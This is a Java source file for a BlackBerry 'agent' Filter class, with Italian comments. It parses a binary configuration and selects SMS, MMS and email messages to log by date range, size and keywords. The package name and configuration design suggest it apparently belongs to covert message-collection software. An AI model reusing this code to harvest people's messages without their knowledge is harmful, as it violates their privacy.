package blackberry.agent;

import java.io.EOFException;
import java.util.Date;
import java.util.Vector;

import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.device.api.util.DataBuffer;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.WChar;

class Filter {
	// #debug
	static Debug debug = new Debug("Filter", DebugLevel.VERBOSE);

	public static final int TYPE_REALTIME = 0;
	public static final int TYPE_COLLECT = 1;

	public static final int CLASS_UNKNOWN = 0;
	public static final int CLASS_SMS = 1;
	public static final int CLASS_MMS = 2;
	public static final int CLASS_EMAIL = 3;

	static final int FILTERED_DISABLED = -1;
	static final int FILTERED_LASTCHECK = -2;
	static final int FILTERED_FROM = -3;
	static final int FILTERED_TO = -4;
	static final int FILTERED_SIZE = -5;
	static final int FILTERED_OK = 0;

	public int size;

	public int version;
	public int type;
	public byte[] classname;
	public int classtype;

	public boolean enabled;
	public boolean all;
	public boolean doFilterFromDate;
	public long fromDate;
	public boolean doFilterToDate;
	public long toDate;
	public long maxMessageSize;
	public long maxMessageSizeToLog;

	public Vector keywords = new Vector();

	boolean valid;

	public int payloadStart;

	public Filter(final byte[] conf, final int offset, final int length) {

		final int headerSize = 116;
		final int classNameLen = 32;
		final int confSize = conf.length - offset;

		Check.requires(confSize >= headerSize, "conf smaller than needed");

		final Prefix headerPrefix = new Prefix(conf, offset);

		if (!headerPrefix.isValid()) {
			return;
		}

		final DataBuffer databuffer = new DataBuffer(conf,
				headerPrefix.payloadStart, headerPrefix.length, false);

		// #ifdef DBC
		Check.asserts(headerPrefix.type == Prefix.TYPE_HEADER,
				"Wrong prefix type");
		Check.asserts(headerSize == headerPrefix.length, "Wrong prefix length");
		// #endif

		// LETTURA del HEADER
		try {

			size = databuffer.readInt();
			version = databuffer.readInt();
			type = databuffer.readInt();

			classname = new byte[classNameLen];
			databuffer.read(classname);

			final String classString = WChar.getString(classname, true);
			if (classString.equals("IPM.SMSText*")) {
				classtype = Filter.CLASS_SMS;
			} else if (classString.equals("IPM.Note*")) {
				classtype = Filter.CLASS_EMAIL;
			} else if (classString.equals("IPM.MMS*")) {
				classtype = Filter.CLASS_MMS;
			} else {
				classtype = Filter.CLASS_UNKNOWN;
				// #debug
				debug.error("classtype unknown: " + classString);
			}

			// #debug debug
			debug.trace("classname: " + classString);

			enabled = databuffer.readBoolean();
			all = databuffer.readBoolean();
			doFilterFromDate = databuffer.readBoolean();
			fromDate = databuffer.readLong();
			doFilterToDate = databuffer.readBoolean();
			toDate = databuffer.readLong();
			maxMessageSize = databuffer.readLong();
			maxMessageSizeToLog = databuffer.readLong();

			payloadStart = (int) (headerPrefix.payloadStart + size);

			valid = true;
		} catch (final EOFException e) {
			valid = false;

		}

		// Lettura delle KEYWORDS
		if (length > headerPrefix.length) {
			// ogni keyword ha il suo prefix
			final int endOffset = offset + length;
			int keywordOffset = offset + headerSize + Prefix.LEN;

			while (keywordOffset < endOffset) {
				final Prefix keywordPrefix = new Prefix(conf, keywordOffset);

				// #ifdef DBC
				Check.asserts(keywordPrefix.type == Prefix.TYPE_KEYWORD,
						"Wrong prefix type");
				// #endif

				final String keyword = WChar.getString(conf, keywordOffset,
						keywordPrefix.length, false);
				keywordOffset += keywordPrefix.length + Prefix.LEN;

				// #debug debug
				debug.trace("Keyword: " + keyword);
				keywords.addElement(keyword);
			}
		}
	}

	public boolean isValid() {
		return valid;
	}

	public int filterMessage(Message message, long lastcheck) throws MessagingException {
		long dataArrivo;
		// #mdebug
		debug.trace("invio dell'email " + message.getSentDate() + " long: "
				+ message.getSentDate().getTime());
		debug.trace("arrivo dell'email " + message.getReceivedDate()
				+ " long: " + message.getReceivedDate().getTime());
		debug.trace("filtro FROM enabled:" + doFilterFromDate + " : "
				+ new Date(fromDate));
		debug.trace("filtro TO enabled:" + doFilterToDate + " : "
				+ new Date(toDate));
		// #enddebug

		// Se c'e' un filtro sulla data
		// entro

		if (!enabled) {
			// #debug debug
			debug.trace("Disabled");
			return FILTERED_DISABLED;
		}

		dataArrivo = message.getReceivedDate().getTime();
		if (dataArrivo < lastcheck) {
			// #debug debug
			debug.trace("dataArrivo < lastcheck :" + dataArrivo + " < "
					+ lastcheck);
			return FILTERED_LASTCHECK;
		}

		// se c'e' il filtro from e non viene rispettato escludi la mail
		if (doFilterFromDate == true && dataArrivo < fromDate) {
			// #debug debug
			debug.trace("doFilterFromDate");
			return FILTERED_FROM;
		}
		// Se c'e' anche il filtro della data di fine e non viene rispettato
		// escludi la mail
		if (doFilterToDate == true && dataArrivo > toDate) {
			// #debug debug
			debug.trace("doFilterToDate");
			return FILTERED_TO;
		}

		int trimAt = 0;
		if ((maxMessageSizeToLog > 0)
				&& (message.getSize() > maxMessageSizeToLog)) {
			// #debug debug
			debug.trace("maxMessageSizeToLog");
			return FILTERED_SIZE;
		}

		return FILTERED_OK;
	}

	
}
